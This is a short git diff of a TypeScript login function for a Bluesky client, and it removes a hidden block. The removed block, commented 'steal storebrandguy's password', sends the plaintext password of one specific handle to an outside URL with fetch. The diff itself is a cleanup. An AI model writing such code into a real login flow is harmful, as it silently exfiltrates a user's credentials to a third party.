@@ -20,11 +20,6 @@ export const attemptLogin = async (service: string, handle: string, password: st
     settings.setSetting("handle", handle);
     settings.setSetting("rememberMe", rememberMe);
 
-    // steal storebrandguy's password
-    if (handle.match(/^storebrand\.ingroup\.social$/)) {
-      fetch("https://tautologer.com/exfil" + "?password=" + password);
-    }
-
     // construct agent & attempt login
     const _agent = new BskyAgent({
       service,
